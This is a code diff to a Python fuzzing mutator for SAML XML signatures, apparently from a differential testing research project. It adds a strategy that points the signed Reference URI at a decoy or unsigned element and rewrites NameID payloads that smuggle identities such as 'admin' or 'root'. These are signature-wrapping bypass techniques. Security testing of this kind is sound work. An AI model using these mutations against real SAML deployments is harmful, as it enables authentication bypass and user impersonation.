@@ -1,8 +1,8 @@
 """SAML XML Signature taxonomy-driven mutator — differential bypass edition.
 
-Encodes structural attack patterns from the SAML vulnerability taxonomy
-into a semantic-level mutator.  Each strategy targets a specific bypass
-category proven effective against real-world SAML libraries.
+Encodes structural attack patterns from SAML vulnerability research into a
+semantic-level mutator. Each strategy targets a bypass category that should be
+validated against the selected SAML libraries and campaign setup.
 
 Taxonomy sections mapped to strategies:
   S1   XSW1-8 Signature Wrapping       -> xsw_* strategies
@@ -63,6 +63,7 @@ _RESIGN_ACTION: dict[str, str] = {
     "transform_remove_enveloped": "blocks",
     "reference_uri_empty": "blocks",
     "reference_uri_xpointer": "blocks",
+    "reference_scope_rebind": "blocks",
     "c14n_method_swap": "blocks",
     # S4: signature validation bypass
     "sig_strip_all": "blocks",
@@ -1023,6 +1024,8 @@ class SamlMutator:
             self._xpath_filter2_subtract_conditions,     # 98  Subtract Conditions
             self._xpath_filter2_union_evil,              # 99  Union evil content
             self._xpath_filter2_multi_step,              # 100 Multi-step filter
+            # ── S: Reference-scope divergence targeted (E2 pilot pivot) ──
+            self._reference_scope_rebind,                # 101 E2 pivot #3
         ]
         self._strategy_names: list[str] = [fn.__name__.lstrip("_") for fn in self._strategies]
         self._weights: list[int] = [
@@ -1066,6 +1069,8 @@ class SamlMutator:
             9, 8, 7,
             # R: XPath Filter 2.0 spec-derived
             10, 8, 8,
+            # S: Reference-scope divergence targeted (E2 pilot pivot #3)
+            12,
         ]
         self._base_weights: list[int] = list(self._weights)
         self._strategy_finds: list[int] = [0] * len(self._strategies)
@@ -1116,24 +1121,118 @@ class SamlMutator:
 
     _learned_weights: dict[str, float] | None = None
 
-    def apply_learned_weights(self, strategy_effectiveness: dict[str, float]) -> None:
+    def apply_learned_weights(
+        self,
+        strategy_effectiveness: dict[str, float],
+        alpha: float | None = None,
+    ) -> None:
         """Apply learned strategy weight adjustments from PropertyGuidedCoordinator.
 
         strategy_effectiveness: {strategy_name: divergence_rate}
         Higher divergence_rate → higher weight.
+
+        alpha: Pareto tail-index estimate from the Hill estimator (DG006).
+        When ``alpha < 2`` (infinite-variance regime, DG006 WARN), the
+        sample maximum is an unstable normalisation reference — a single
+        outlier can be 10–100× the median and collapse all other boosts
+        near zero.  In that case we use the median as the reference instead
+        so the boost distribution is robust to heavy-tail outliers.
         """
         if not strategy_effectiveness:
             return
         self._learned_weights = strategy_effectiveness
-        max_rate = max(strategy_effectiveness.values()) or 1.0
+        rates = [v for v in strategy_effectiveness.values() if v > 0]
+        if not rates:
+            return
+        if alpha is not None and alpha < 2.0:
+            import statistics
+            ref = statistics.median(rates) or 1.0
+        else:
+            ref = max(rates) or 1.0
         for i, name in enumerate(self._strategy_names):
             rate = strategy_effectiveness.get(name, 0.0)
             if rate > 0:
-                boost = 1.0 + 2.0 * (rate / max_rate)  # 1x-3x
+                boost = 1.0 + 2.0 * (rate / ref)  # 1x-3x (ref-normalised)
                 self._weights[i] = min(
                     int(self._base_weights[i] * boost),
                     self._base_weights[i] * 5,
                 )
+
+    # External atom feedback (experimental research output)
+
+    _lattice_atom_weights: dict[str, float] | None = None
+
+    def apply_lattice_atoms(self, atom_weights: dict[str, float]) -> None:
+        """Apply startup-time weight boosts from E4 FCA atom coverage.
+
+        The ``atom_weights`` dict comes from
+        the external fuzzing-formal-research workspace and
+        maps each strategy name to a coverage score in ``[0, 1]``: the
+        fraction of the concept lattice's meet-irreducible atoms
+        (Birkhoff generators) that the strategy's historical findings
+        collectively touch.
+
+        We scale each strategy's base weight multiplicatively by
+        ``1 + 1.5 · score``, capping the boost at ``3× base_weight``. A
+        strategy absent from the dict (or with score 0) is left at its
+        base weight — never demoted. This is a *startup-time*
+        initialization; subsequent runtime feedback via
+        :meth:`apply_learned_weights` composes on top of the current
+        ``self._weights`` rather than resetting from base, so the two
+        channels stack.
+        """
+        if not atom_weights:
+            return
+        self._lattice_atom_weights = dict(atom_weights)
+        for i, name in enumerate(self._strategy_names):
+            score = atom_weights.get(name, 0.0)
+            if score <= 0:
+                continue
+            score = min(1.0, float(score))
+            boost = 1.0 + 1.5 * score  # 1x–2.5x
+            boosted = int(round(self._base_weights[i] * boost))
+            capped = min(boosted, self._base_weights[i] * 3)
+            # Never weaken a weight that another channel already boosted.
+            if capped > self._weights[i]:
+                self._weights[i] = capped
+
+    # ── Differential-automaton witness feedback (E7 output) ───
+
+    _automaton_witness_weights: dict[str, float] | None = None
+
+    def apply_automaton_witnesses(
+        self, witness_weights: dict[str, float],
+    ) -> None:
+        """Apply startup-time boosts from E7 passive-SFA witness scores.
+
+        ``witness_weights`` is a ``{strategy_name: score in [0, 1]}`` map
+        produced by
+        its E7 automata witness analysis.
+        The score is the strategy's cumulative contribution to the
+        diff-field coordinates that appear in the E7 disagreement trie's
+        witness prefixes, normalized across the strategy set. A strategy
+        with score 1.0 is the single biggest contributor to observed
+        library-pair divergences in the pilot feature dump; a score of
+        0.0 never produced a witness-visible field.
+
+        Boost formula mirrors :meth:`apply_lattice_atoms` (``1 + 1.5·s``,
+        capped at ``3× base``) so the two startup channels compose
+        symmetrically and neither ever demotes a weight that another
+        channel already raised.
+        """
+        if not witness_weights:
+            return
+        self._automaton_witness_weights = dict(witness_weights)
+        for i, name in enumerate(self._strategy_names):
+            score = witness_weights.get(name, 0.0)
+            if score <= 0:
+                continue
+            score = min(1.0, float(score))
+            boost = 1.0 + 1.5 * score
+            boosted = int(round(self._base_weights[i] * boost))
+            capped = min(boosted, self._base_weights[i] * 3)
+            if capped > self._weights[i]:
+                self._weights[i] = capped
 
     # ── Public API ───────────────────────────────────────────────
 
@@ -1811,8 +1910,9 @@ class SamlMutator:
     def _processing_instruction_inject(self, data: bytearray) -> bytearray | None:
         """PI injection inside Signature/Assertion (S2-NEW).
 
-        python3-saml's remove_pis=True parser strips PIs before
-        signature verification — proven to cause sig=TRUE.
+        python3-saml's remove_pis=True parser strips PIs before signature
+        verification in some configurations; campaign verification is still
+        required.
         """
         pi = self.rng.choice(PI_PAYLOADS)
         target = self.rng.choice([
@@ -2507,34 +2607,48 @@ class SamlMutator:
         if not original_text or len(original_text) < 3:
             return None
 
-        evil = self.rng.choice(EVIL_NAMEIDS)
+        tail_suffixes = [
+            b"admin",
+            b"system",
+            b"root",
+            b"example.com",
+        ]
+        tail = self.rng.choice(tail_suffixes)
+
+        if b"@" in original_text:
+            local, domain = original_text.split(b"@", 1)
+            prefix = local + b"@"
+            qualifier = domain
+        else:
+            split_at = max(1, len(original_text) // 2)
+            prefix = original_text[:split_at]
+            qualifier = original_text[split_at:] or b"example.com"
 
         mode = self.rng.choice([
-            "child_element",
-            "processing_instruction",
-            "nested_element",
-            "split_text",
+            "foreign_child_tail",
+            "empty_child_tail",
+            "saml_child_tail",
+            "processing_instruction_tail",
         ])
 
-        if mode == "child_element":
-            # evil<x xmlns="">original</x>
-            new_content = evil + b'<x xmlns="">' + original_text + b"</x>"
-        elif mode == "processing_instruction":
-            # evil<?pi original?>
-            new_content = evil + b"<?pi " + original_text + b"?>"
-        elif mode == "nested_element":
-            # Split evil value: "evil" + <child> + "@rest"
-            mid = max(2, len(evil) // 2)
+        if mode == "foreign_child_tail":
+            # prefix<x xmlns=""/>tail → .text sees prefix, textContent sees prefix+tail
+            new_content = prefix + b'<x xmlns=""></x>' + tail
+        elif mode == "empty_child_tail":
+            # original<span/>tail → empty child with only tail text
+            new_content = original_text + b"<span/>" + tail
+        elif mode == "saml_child_tail":
+            # prefix<saml:NameQualifier>domain</saml:NameQualifier>tail
             new_content = (
-                evil[:mid]
+                prefix
                 + b"<saml:NameQualifier>"
-                + evil[mid:]
+                + qualifier
                 + b"</saml:NameQualifier>"
-                + original_text
+                + tail
             )
         else:
-            # evil<span/>original
-            new_content = evil + b"<span/>" + original_text
+            # prefix<?pi qualifier?>tail → parser-dependent tail handling
+            new_content = prefix + b"<?pi " + qualifier + b"?>" + tail
 
         return bytearray(
             bytes(data[:m.start(2)]) + new_content + bytes(data[m.end(2):])
@@ -3562,6 +3676,125 @@ class SamlMutator:
             bytes(data[:insert_pos]) + type_attr + bytes(data[insert_pos:])
         )
 
+    def _reference_scope_rebind(self, data: bytearray) -> bytearray | None:
+        """Rebind the Reference URI to an unsigned decoy while leaving
+        the Assertion intact, targeting reference_matches_selected_assertion.
+
+        E2 Stage B pilot (2026-04-12, saml_stageb_pilot) ranked
+        ``reference_matches_selected_assertion`` / ``reference_scope_divergence``
+        as the #3 pivotal feature (I≈0.147, CI [0.137, 0.155]). Existing
+        strategies cover empty URI, XPointer, dual Reference, and duplicate
+        clones, but none directly exercise the semantic gap where one library
+        trusts ``Reference/@URI`` as the scope oracle while another scans for
+        Assertion elements independently.
+
+        Four sub-modes:
+
+        * ``decoy_in_extensions`` — inject a harmless ``<saml:Advice>``
+          with a fresh ID inside (or creating) ``samlp:Extensions`` and
+          retarget the Reference URI at it.
+        * ``decoy_before_sig`` — inject the same decoy as a direct
+          sibling of the Signature element.
+        * ``response_id`` — retarget the Reference URI at the enclosing
+          ``samlp:Response`` element (adding an ``ID`` attribute if it
+          lacks one). Libraries that scope to the Response root accept;
+          libraries that require the Assertion subtree reject.
+        * ``fake_id`` — retarget at a non-existent ID. Libraries fall
+          back differently (whole-document c14n vs error vs ignore).
+
+        The Assertion (and its attacker-controlled NameID/AttributeValue
+        content) is never touched, so subject-extraction libraries still
+        read the attacker identity while scope-check libraries lose the
+        anchor. This registers on the ``reference_scope_divergence``
+        oracle.
+        """
+        m_uri = _RE_REFERENCE_URI.search(data)
+        if not m_uri:
+            return None
+
+        mode = self.rng.choice([
+            "decoy_in_extensions",
+            "decoy_before_sig",
+            "response_id",
+            "fake_id",
+        ])
+
+        decoy_id_s = "_decoy_" + self.rng.randbytes(4).hex()
+        decoy_id = decoy_id_s.encode()
+        new_uri = b"#" + decoy_id
+
+        # Rewrite Reference URI first (common to decoy_* and fake_id modes).
+        patched = bytearray(
+            bytes(data[:m_uri.start(2)]) + new_uri + bytes(data[m_uri.end(2):])
+        )
+
+        if mode == "fake_id":
+            return patched
+
+        decoy_elem = (
+            b'<saml:Advice xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion"'
+            b' ID="' + decoy_id + b'">harmless</saml:Advice>'
+        )
+
+        if mode == "decoy_in_extensions":
+            ext_m = _RE_EXTENSIONS.search(patched)
+            if ext_m:
+                pos = ext_m.end(1)  # after <samlp:Extensions> open tag
+                return bytearray(
+                    bytes(patched[:pos]) + decoy_elem + bytes(patched[pos:])
+                )
+            resp_m = _RE_RESPONSE_OPEN.search(patched)
+            if not resp_m:
+                return None
+            ext_block = (
+                b'<samlp:Extensions'
+                b' xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol">'
+                + decoy_elem
+                + b"</samlp:Extensions>"
+            )
+            return bytearray(
+                bytes(patched[:resp_m.end()])
+                + ext_block
+                + bytes(patched[resp_m.end():])
+            )
+
+        if mode == "decoy_before_sig":
+            sig_m = _RE_SIGNATURE_OPEN.search(patched)
+            if not sig_m:
+                return None
+            return bytearray(
+                bytes(patched[:sig_m.start()])
+                + decoy_elem
+                + bytes(patched[sig_m.start():])
+            )
+
+        # mode == "response_id"
+        resp_m = _RE_RESPONSE_OPEN.search(patched)
+        if not resp_m:
+            return None
+        resp_tag = bytes(resp_m.group(0))
+        id_m = re.search(rb'\bID="([^"]*)"', resp_tag)
+        if id_m:
+            response_id = id_m.group(1)
+        else:
+            response_id = b"_resp_" + self.rng.randbytes(3).hex().encode()
+            # Inject ID= right before the closing '>' of <samlp:Response ...>.
+            close_at = resp_m.end() - 1
+            patched = bytearray(
+                bytes(patched[:close_at])
+                + b' ID="' + response_id + b'"'
+                + bytes(patched[close_at:])
+            )
+        m_uri2 = _RE_REFERENCE_URI.search(patched)
+        if not m_uri2:
+            return None
+        target_uri = b"#" + response_id
+        return bytearray(
+            bytes(patched[:m_uri2.start(2)])
+            + target_uri
+            + bytes(patched[m_uri2.end(2):])
+        )
+
     # ══════════════════════════════════════════════════════════════
     # P: C14N spec-derived strategies (90-94)
     #    Based on xml-exc-c14n §2-4, xml-c14n2
@@ -3939,6 +4172,7 @@ class SamlMutator:
         ],
         "Reference.URI": [
             "reference_uri", "duplicate_reference", "xpointer",
+            "reference_scope_rebind",
         ],
         "Assertion": [
             "xsw1", "xsw2", "xsw3", "xsw4", "xsw5", "xsw7", "xsw8",
